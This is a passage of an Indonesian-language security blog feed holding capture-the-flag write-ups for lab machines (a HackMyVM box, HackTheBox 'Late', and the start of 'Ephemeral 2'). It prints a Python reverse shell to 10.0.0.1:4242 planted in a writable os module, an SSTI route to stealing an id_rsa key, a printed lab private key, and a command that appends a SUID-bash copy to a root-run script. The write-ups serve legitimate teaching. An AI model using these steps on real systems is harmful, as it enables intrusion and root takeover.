<span class="n">yGIvtnS2cqba2ZV</span><span class="p">+</span><span class="n">hf</span><span class="p">+</span><span class="n">f6v2UfWrklUUQAAAMEA67IDfAydw2cFEhiE1GJloH4Jk2K7gr2U</span>
<span class="n">XfjoCRcNp9x9kiaaiynqhXAGQWt7F0ouZEKvUIFSCVDKr1oFgnXD2czQcVRu2Mz2UA</span><span class="p">+</span><span class="n">RWQ</span>
<span class="n">LgMcY6zaE7uCYg9ANM5Ne9uc6FOmxNpmv3fLI7Z0ROlD</span><span class="p">/</span><span class="n">g5b2pwahcIlXAJpZqrkKJnD5A</span>
<span class="m">1</span><span class="n">A9Vth0</span><span class="p">+</span><span class="m">98l11</span><span class="n">G3</span><span class="p">/+</span><span class="n">YAEawCEJAHnIWgUq5kq1</span><span class="p">/</span><span class="n">OFKYXDhxew9KBnhr</span><span class="p">+</span><span class="n">yHOGE6TVLUnxdwQ</span>
<span class="m">46</span><span class="n">q7aIDpVmMKMlAAAADmRhdmlkQGZyZWU0YWxsAQIDBA</span><span class="p">==</span>
<span class="p">-----</span><span class="n">END</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
</code></pre></div></div>
<p>lalu ketika saya coba, this system still asks for the password.</p>

<p><img src="https://i.ibb.co/MZf2LM3/image.png" alt="askpassword" /></p>

<p>lalu saya berganti arah dan mencoba untuk melihat <em>response</em> dari result <em>brute-force</em> tadi dan menemukan kejanggalan pada file <strong>.viminfo</strong>.</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/<span class="m">1</span><span class="p">.</span><span class="m">1</span> <span class="m">200</span> OK
Server<span class="p">:</span> nginx/<span class="m">1</span><span class="p">.</span><span class="m">18</span><span class="p">.</span><span class="m">0</span>
Date<span class="p">:</span> Mon<span class="p">,</span> <span class="m">16</span> May <span class="m">2022</span> <span class="m">07</span><span class="p">:</span><span class="m">40</span><span class="p">:</span><span class="m">22</span> GMT
Content<span class="p">-</span>Type<span class="p">:</span> text/html; charset<span class="p">=</span>UTF<span class="m">-8</span>
Connection<span class="p">:</span> <span class="k">close</span>
Content<span class="p">-</span>Length<span class="p">:</span> <span class="m">786</span>

<span class="p">&lt;</span><span class="k">p</span> align<span class="p">=</span><span class="s1">'center'</span><span class="p">&gt;</span> <span class="p">&lt;</span>font color<span class="p">=</span>white size<span class="p">=</span><span class="s1">'5pt'</span><span class="p">&gt;</span> # This <span class="nb">viminfo</span> <span class="k">file</span> was generated by Vim <span class="m">8</span><span class="p">.</span><span class="m">2</span><span class="p">.</span>
# You may <span class="k">edit</span> it <span class="k">if</span> you'<span class="nb">re</span> careful<span class="p">!</span>

# Viminfo <span class="k">version</span>
<span class="p">|</span><span class="m">1</span><span class="p">,</span><span class="m">4</span>

# Value of <span class="s1">'encoding'</span> when this <span class="k">file</span> was written
*<span class="nb">encoding</span><span class="p">=</span>utf<span class="m">-8</span>


# <span class="nb">hlsearch</span> <span class="k">on</span> <span class="p">(</span>H<span class="p">)</span> <span class="nb">or</span> off <span class="p">(</span><span class="k">h</span><span class="p">):</span>
<span class="p">~</span><span class="k">h</span>
# Command Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>
<span class="p">:</span><span class="k">wq</span><span class="p">!</span>
<span class="p">|</span><span class="m">2</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">1648909714</span><span class="p">,,</span><span class="s2">"wq!"</span>

# Search String History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Expression History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Input Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Debug Line History <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

# Registers<span class="p">:</span>

# Password <span class="k">file</span> Created<span class="p">:</span>
'<span class="m">0</span>  <span class="m">1</span>  <span class="m">3</span>  <span class="sr">/usr/</span>local<span class="sr">/etc/</span>mypass<span class="p">.</span>txt
<span class="p">|</span><span class="m">4</span><span class="p">,</span><span class="m">48</span><span class="p">,</span><span class="m">1</span><span class="p">,</span><span class="m">3</span><span class="p">,</span><span class="m">1648909714</span><span class="p">,</span><span class="s2">"/usr/local/etc/mypass.txt"</span>

# History of <span class="k">marks</span> within <span class="k">files</span> <span class="p">(</span>newest <span class="k">to</span> oldest<span class="p">):</span>

<span class="p">&gt;</span> <span class="sr">/usr/</span>local<span class="sr">/etc/</span>mypass<span class="p">.</span>txt
	*	<span class="m">1648909713</span>	<span class="m">0</span>
	<span class="c">"	1	3</span>
	^	<span class="m">1</span>	<span class="m">4</span>
	<span class="p">.</span>	<span class="m">1</span>	<span class="m">3</span>
	<span class="p">+</span>	<span class="m">1</span>	<span class="m">3</span>
 <span class="k">is</span> already registered<span class="p">!</span> <span class="p">&lt;</span><span class="sr">/font&gt; &lt;/</span><span class="k">p</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>ada orang sebodoh ini menyimpan passwordnya pada komputernya sendiri, hadeh. sebenarnya tidak masalah cuma kaya aneh saja kenapa tidak di cloud atau dimana gitu kalau mau lebih aman.
entah si selera orang beda-beda, dan mungkin ini termasuk <em>human error</em> ya. dan lanjut, ketika saya read file nya and yeah saya mendapatkan passwordnya.</p>

<p><img src="https://i.ibb.co/JjkKYvZ/image.png" alt="damn" /></p>

<h2 id="shell-as-david">shell as david</h2>

<p><img src="https://i.ibb.co/Lt63Htp/image.png" alt="shell" /></p>

<h2 id="privilege-escalation">privilege escalation</h2>

<p>saya sudah menjalankan <strong>linpeas</strong> sebuah automated script untuk mengakses berbagai metode ke privesc. tapi mungkin saya kurang analitis terhadap hal ini, jadi saya pindah untuk mencoba metode lain 
ya, dengan menggunakan <strong>pspy</strong> dan saya menemukan hal menarik.</p>

<p><img src="https://i.ibb.co/3M69dpN/image.png" alt="pspy" /></p>

<p>tiba-tiba ada <em>python script</em> tereksekusi secara automasi dari UID root. lalu saya mencoba untuk membaca kode jika mempunyai permission.</p>

<p><img src="https://i.ibb.co/sFB3z8p/image.png" alt="lmfao" /></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># Reading only first line
</span><span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/david/cmd.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">read_only_first_line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="c1"># Write a new file
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/suid.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">read_only_first_line</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">check</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s">'/tmp/suid.txt'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">check</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"File exists"</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /bin/bash"</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">NameError</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"File not exists"</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"File not exists"</span><span class="p">)</span>
</code></pre></div></div>
<p>dari <em>source code</em> sendiri dinyatakan bahwa jika kita menambahkan file <strong>cmd.txt</strong> ke <strong>$HOME</strong> path user dengan menambahkan apa saja di first line, dan juga menambahkan file text di 
path <strong>/tmp</strong> dengan nama <strong>suid.txt</strong> maka script akan menjalankan sebuah perintah <strong>chmod +s</strong> yaitu SUID atau semacam spesial permission untuk <em>executable</em> yang dimana secara harfiah
user apapun tanpa privilege apapun bisa mengeksekusi executable. tapi ketika saya coba hasilnya nihil.</p>

<p><img src="https://i.ibb.co/k5n0tBK/image.png" alt="aduh" /></p>

<p>lalu saya berfikir dari <em>source code</em> juga ada module yang dipakai, apakah writable atau tidak lalu saya mencoba untuk ngecek.</p>

<p><img src="https://i.ibb.co/TqDcFXb/image.png" alt="waw" /></p>

<p>dengan begitu saya tambahkan reverse shell python di module script <strong>os</strong> tadi.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span> 
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.0.0.1"</span><span class="p">,</span><span class="mi">4242</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">])</span>
</code></pre></div></div>

<p><img src="https://i.ibb.co/861rcRL/image.png" alt="gambarlmfao" /></p>

<p>itu bukan double quote, harusnya pake single quote salah screenshot saya. menggunakan ini <strong>â€˜</strong>.</p>

<p><img src="https://i.ibb.co/QD4Pg6z/image.png" alt="kontoldon" /></p>

<p>and boom, we got the root.</p>
<h2 id="referensi">Referensi</h2>

<ul>
  <li><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-results">https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-results</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="XXE" /><category term="fuzzing" /><category term="LFI" /><category term="burp-intruder" /><summary type="html"><![CDATA[Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari hackmyvm berkategori Easy ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan local file read atau inclusion sampai fuzzing dari user directory untuk mendapatkan password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root.]]></summary></entry><entry><title type="html">HackTheBox: Late</title><link href="http://localhost:4000/htb-late" rel="alternate" type="text/html" title="HackTheBox: Late" /><published>2022-05-08T00:00:00+07:00</published><updated>2022-05-08T00:00:00+07:00</updated><id>http://localhost:4000/htb-late</id><content type="html" xml:base="http://localhost:4000/htb-late"><![CDATA[<p>itâ€™s been a while man, i havenâ€™t written on this blog and finally saya mulai menulis kembali, saya sampai lupa kalau saya sendiri punya blog yang mungkin harus diisi berapa tahun sekali.
jadi di blog kali ini hanya writeup untuk mesin <a href="https://www.hackthebox.com/home/machines/profile/463">Late</a>. dengan kategori <strong>easy</strong> lagi untuk memenuhi tulisan-tulisan yang ada di blog ini.
sebenarnya ingin sekali saya menulis blog disini menggunakan bahasa inggris ye kan. tapi saya liat lagi dari niat awal saya menulis disini memang saya set ke indonesia, untuk mengenalkan
red-teaming / pentesting ke orang-orang yang ingin terjun. walaupun memang di indonesia sendiri banyak suhu hehehe.</p>

<h2 id="recon">Recon</h2>
<p>apapun itu saya pasti mengawali boot2root dengan reconnaisance menggunakan <strong>rustscan</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw<span class="o">=</span>
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</code></pre></div></div>
<p>result diatas menghasilkan 2 port antara lain:</p>
<ul>
  <li>22, SSH.</li>
  <li>80, HTTP dengan nginx server dari sistem operasi <em>Ubuntu</em>.</li>
</ul>

<h2 id="80---http-static-site">80 - http static site</h2>
<p><img src="https://i.ibb.co/vYrP2NT/page1.png" alt="gambar" /></p>

<p>okay, dari gambar sendiri sudah terlihat bahwa website ini seperti menyediakan fitur photo editor, cukup menarik.
sebelum itu, kita tambahkan terlebih dahulu domain <strong>late.htb</strong> ke file host <strong>/etc/hosts</strong> agar lebih efisien.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.10.11.156 late.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<h2 id="discovering-web-content">discovering web-content.</h2>
<p>dari result dibawah ini</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/assets               (Status: 301) [Size: 194] [--&gt; http://late.htb/assets/]
/contact.html         (Status: 200) [Size: 6364]                             
/index.html           (Status: 200) [Size: 9461]  
</code></pre></div></div>
<p>terlihat senseless and we should go to the next part.</p>

<h2 id="subdomain-fuzzing">subdomain fuzzing</h2>
<p>sebenarnya metode ini tidak perlu dilakukan karena pada segmen <strong>FAQ</strong> kita diredireksikan ke subdomain <strong>images.late.htb</strong>.
tanpa perlu buang-buang waktu, itu sudah sangat jelas valid. tapi saya gini-gini juga ingin menambahkan sub-bab agar tambah menarik.</p>

<p><img src="https://i.ibb.co/gdDQxGr/image.png" alt="gambar2" /> <br />
<em>shoutout to <a href="https://www.hackthebox.com/home/users/profile/532180">@lordrukie</a> for helping me to fix up this this problem.</em></p>

<p>yap karena sudah valid maka kita tambahkan virtualhost (<strong>images.late.htb</strong>) tersebut ke <strong>/etc/hosts</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.10.11.156 images.late.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<h2 id="imageslatehtb">images.late.htb</h2>

<p><img src="https://i.ibb.co/514fVtF/page2.png" alt="gambar3" /></p>

<p>terlihat seperti upload form, (ya memang upload form sat). dari teks deskripsi tepat dibawah judul sudah terbaca bahwasanya jika ingin mengalihkan image ke dokumen teks, gunakan tools ini saja. walaupun kaidah 
terjemah aslinya tidak seperti itu, ya memang tidak saya esensialkan cuma biar pas aja gitu ah ga seru dih. <br />
tepat di samping kanan judul terdapat tulisan <strong>flask</strong>. saya coba analisa dengan extension wappalyzer.</p>

<p><img src="https://i.ibb.co/4Km6ZGR/image.png" alt="gambar4" /></p>

<p>ternyata tidak tercantum, mungkin ini service yang ada dalam web-server.<br />
Apa itu <strong>Flask</strong>? Jika dari <a href="https://en.wikipedia.org/wiki/Flask_(web_framework)">Wikipedia</a> ini jawabannya.</p>

<blockquote>
  <p>Flask is a micro web framework written in Python. It is classified as a microframework because it does not require particular tools or libraries. It has no database abstraction layer, form validation, or any other components where pre-existing third-party libraries provide common functions. However, Flask supports extensions that can add application features as if they were implemented in Flask itself. Extensions exist for object-relational mappers, form validation, upload handling, various open authentication technologies and several common framework related tools.</p>
</blockquote>

<p>Oh, ternyata sebuah <em>microframework</em> terbuat dari <em>Python</em>. berarti dari sini saya sudah berfikir bahwa tidak bisa untuk upload shell berformat <em>PHP</em>. akankah sangat konyol, web-server dari python mengeksekusi file berformat <em>PHP</em>. hanya orang bodoh yang mencoba hal ini, tapi apa salahnya mencoba jika estimasi tidak akuratpun tak apa.</p>

<p><img src="https://i.ibb.co/yQM260c/image.png" alt="gambar5" /></p>

<p>Jika mengutip dari <strong>Wikipedia</strong>. dari nama-nama kompenen diatas, masih sangat familiar dengan <strong>SSTI</strong> (<em>Server-side Template Injection</em>) untuk dicoba. Tapi dari sisi mana saya harus mencoba? pikir saya saat sedang frustasi karena stuck pada upload shell berformat PHP tadi dan kewalahan
karena saya lupa kalo visi dari website ini adalah untuk membantu mengonversi image ke text.</p>

<h2 id="server-side-template-injection">Server-side Template Injection</h2>
<p>Saya coba semua payload dari jenis apapun, yang ada pada <a href="#referensi">hacktricks</a>, menggunakan render dari <a href="#referensi">google fonts</a> yang discreenshot menggunakan <em>flameshot</em> lalu disave dengan format <em>png</em>.</p>

<p><img src="https://i.ibb.co/tchmt5b/ssti.png" alt="gambar6" /></p>

<p>hasilnya seperti gambar dibawah ini, jika termultiplikasikan maka proses injeksi berfungsi.</p>

<p><img src="https://i.ibb.co/wrxV9Zh/image.png" alt="gambar7" /></p>

<p>lalu saya coba lagi dengan payload dibawah ini, jika eksekusi berhasil maka output yang didapat akan berbeda.</p>

<p><img src="https://i.ibb.co/1ZtbhZz/ssti.png" alt="gambar8" /></p>

<p>And yas! we got the result weâ€™ve been looking for</p>

<p><img src="https://i.ibb.co/5xwDqDN/image.png" alt="gambar9" /></p>

<h2 id="shell-as-svc">shell as svc</h2>

<p>Karena tadi saya bisa mendapatkan sebuah output dari command <em>â€˜idâ€™</em> sebagai request dari injeksi. maka kali ini saya akan mencoba untuk mengambil <strong>id_rsa</strong> dari user tersebut. dengan payload dibawah ini</p>

<p><img src="https://i.ibb.co/CH3F7fL/ssti.png" alt="gambar10" /> <br />
And boom, we got the <strong>id_rsa</strong> key to get connected to ssh.</p>

<p><img src="https://i.ibb.co/CtgHZ5y/image.png" alt="gambar11" />.</p>

<p>langsung konek, dan yap we got the user flag.</p>

<p><img src="https://i.ibb.co/c1jPvdc/image.png" alt="gambar12" /></p>

<h2 id="shell-as-root">shell as root</h2>

<p>karena di $HOME path ada <em>linpeas</em> entah ini punya siapa atau memang bekasan saya saat sedang main. yang terpenting ialah memakainya saja.</p>
<blockquote>
  <p>linPEAS adalah sebuah automated script yang dibuat oleh Carlos P. ini juga dibuat dengan sebuah objek sederhana untuk mengenumerasi semua jalan yang memungkinkan atau metode untuk ekskalasi pada linux system.</p>
</blockquote>

<p>saat saya eksekusi, saya tidak menemukan hal yang menarik pada linPEAS. mari kita coba cek proses dengan menggunakan automated-script ternama yaitu, <strong>pspy</strong>.
and, ketika saya login pake ssh lagi dengan terminal yang lain suddenly saya menemukan random script dengan <strong>UID=0</strong> who runs the script.</p>

<p><img src="https://i.ibb.co/pv52jyD/image.png" alt="gambar13" /></p>

<p>saat saya cek permissionnya, ternyata kita bisa overwrite pada script tersebut tanpa naik privilege. lalu saya berinisiatif untuk hijack <strong>bash</strong> dari root dengan command dibawah ini.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash"</span> <span class="o">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh
</code></pre></div></div>
<p>lalu saat saya re-log ssh, dan saya pergi ke directory <strong>/tmp</strong>. dan menjalankan bash dengan command <strong>-p</strong> untuk elevasi privilege.</p>

<p><img src="https://i.ibb.co/68XVxzb/image.png" alt="gambar14" /></p>

<p>and we have rooted.</p>

<h2 id="referensi">Referensi</h2>
<ul>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md</a></li>
  <li><a href="https://fonts.google.com">https://fonts.google.com</a></li>
  <li><a href="https://github.com/nikssardana/flaskOcr">https://github.com/nikssardana/flaskOcr</a></li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="SSTI" /><category term="linux-permission" /><category term="flask" /><summary type="html"><![CDATA[itâ€™s been a while man, i havenâ€™t written on this blog and finally saya mulai menulis kembali, saya sampai lupa kalau saya sendiri punya blog yang mungkin harus diisi berapa tahun sekali. jadi di blog kali ini hanya writeup untuk mesin Late. dengan kategori easy lagi untuk memenuhi tulisan-tulisan yang ada di blog ini. sebenarnya ingin sekali saya menulis blog disini menggunakan bahasa inggris ye kan. tapi saya liat lagi dari niat awal saya menulis disini memang saya set ke indonesia, untuk mengenalkan red-teaming / pentesting ke orang-orang yang ingin terjun. walaupun memang di indonesia sendiri banyak suhu hehehe.]]></summary></entry><entry><title type="html">HackMyVM: Ephemeral 2</title><link href="http://localhost:4000/hmv-ephemeral2" rel="alternate" type="text/html" title="HackMyVM: Ephemeral 2" /><published>2022-05-01T00:00:00+07:00</published><updated>2022-05-01T00:00:00+07:00</updated><id>http://localhost:4000/hmv-ephemeral2</id><content type="html" xml:base="http://localhost:4000/hmv-ephemeral2"><![CDATA[<p>Enumerasi SMB menggunakan <em>enum4linux</em> untuk mendapatkan <em>user-user</em>nya lalu mulai <em>brute force</em> untuk bisa akses ke <strong>CIFS</strong> (<em>Common Internet File System</em>) lalu mounting dan replacing <em>reverse shell</em> ke dalam <em>mounted directory</em> yang 
di dalamnya terdapat script dijalankan secara automasi bernama <strong>smbscript.elf</strong>. Dan setelahnya boleh disimak lebih dalam lagi mengenai pembahasan mesin <em>Ephemeral</em> seri ke dua
dengan difficulty <strong>Medium</strong> dari <a href="https://hackmyvm.eu">HackMyVM</a>. dibuat oleh <a href="https://hackmyvm.eu/profile/?user=Proxy">Proxy</a>. seri pertama malah dua minggu kemudian baru saya garap. 
setelah blog ini rilis, baru ada kayanya.</p>

<p><img src="https://i.postimg.cc/Jn9khzPL/image.png" alt="damn" /></p>

<p><img src="https://i.postimg.cc/Jhp3R8fr/image.png" alt="root" /></p>

<h2 id="recon">Recon</h2>

<p>Hasil scan disini adalah, SSH (22), HTTP (80), SMB (139), SMB (445).</p>
<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>     <span class="n">REASON</span>  <span class="n">VERSION</span>
<span class="m">22</span><span class="p">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">ssh</span>         <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">OpenSSH</span> <span class="m">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="m">4u</span><span class="n">buntu0</span><span class="p">.</span><span class="m">4</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="m">2.0</span><span class="p">)</span>
<span class="p">|</span> <span class="n">ssh</span><span class="p">-</span><span class="n">hostkey</span><span class="p">:</span>
<span class="p">|</span>   <span class="m">3072</span> <span class="m">0</span><span class="n">a</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="m">53</span><span class="p">:</span><span class="m">7</span><span class="n">e</span><span class="p">:</span><span class="m">6</span><span class="n">b</span><span class="p">:</span><span class="m">31</span><span class="p">:</span><span class="m">2</span><span class="n">c</span><span class="p">:</span><span class="m">10</span><span class="p">:</span><span class="m">1</span><span class="n">e</span><span class="p">:</span><span class="m">6d</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="m">01</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="nf">a2</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="p">|</span> <span class="n">ssh</span><span class="p">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABgQC4EkKlQsLoJ</span><span class="p">+</span><span class="n">r82mQnd6FWkjL2Ry4tLVriMceGPvzHNFlbbkpa7kkAIf3TtOp7Tads45gLfrNVTC98MHegGZwvL3aIaFPp0LodGxJeQG2lgudoWY9M5sfLMd5oUpcykWXcZfpibQVVhQSpPg4tIpWRVrIKZrBo2CxV8XsRh5RevdNZzzJ6w3D8zuwaBkHD7KI</span><span class="p">+</span><span class="m">2</span><span class="n">eaiuAYrmEkbUVHLkstY</span><span class="p">/</span><span class="n">nHclJwsDBMkx</span><span class="p">+</span><span class="n">u4gv7Rz3S37gmYhg8a74iZqqFpDF47AJ8fcC3k6pXQr3iArgpOU2Rc20THgwn8nRBit2CzO9C5DIf1KvoKIlNftYXK</span><span class="p">+</span><span class="n">Wnw2FmIGUmF7YxjC3ys1uXDahRjcW6EKZpRb2XKzPNtfoR</span><span class="p">+</span><span class="n">sdOPvLJkcXubn5</span><span class="p">/</span><span class="n">HTuy5HKmfk7cByX6</span><span class="p">/</span><span class="m">6</span><span class="n">KwYau11OxrM87YL</span><span class="p">+</span><span class="n">Fyl0VUobTKrC3570aaFamtWCd</span><span class="p">/</span><span class="n">A7oB3xsxQ8pSr7l2Pjx</span><span class="p">+</span><span class="m">20</span><span class="n">BSGjvw7dkMG1Yecf</span><span class="p">/</span><span class="m">79D</span><span class="n">b9f</span><span class="p">+</span><span class="n">DvxrLEIUOxRUWAGijr</span><span class="p">++</span><span class="n">Ar5s88</span><span class="p">=</span>
<span class="p">|</span>   <span class="m">256</span> <span class="n">cd</span><span class="p">:</span><span class="m">19</span><span class="p">:</span><span class="m">04</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="m">8</span><span class="n">a</span><span class="p">:</span><span class="m">8</span><span class="n">b</span><span class="p">:</span><span class="m">3d</span><span class="p">:</span><span class="m">3</span><span class="n">e</span><span class="p">:</span><span class="m">17</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="m">21</span><span class="p">:</span><span class="m">5d</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="m">6</span><span class="n">e</span><span class="p">:</span><span class="m">49</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
